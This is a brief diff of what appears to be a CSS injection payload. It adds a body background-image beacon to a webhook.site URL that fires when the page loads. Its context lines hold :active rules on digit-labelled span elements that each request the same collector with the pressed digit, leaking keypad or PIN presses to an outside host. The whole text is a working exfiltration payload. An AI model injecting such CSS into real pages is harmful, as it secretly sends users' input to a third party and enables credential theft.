@@ -11,6 +11,8 @@ console.log(css_source);
 
 */
 
+body {background-image: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=loaded');}
+
 span[role=img][aria-label="1"]:active {background: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=1');}
 span[role=img][aria-label="2"]:active {background: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=2');}
 span[role=img][aria-label="3"]:active {background: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=3');}
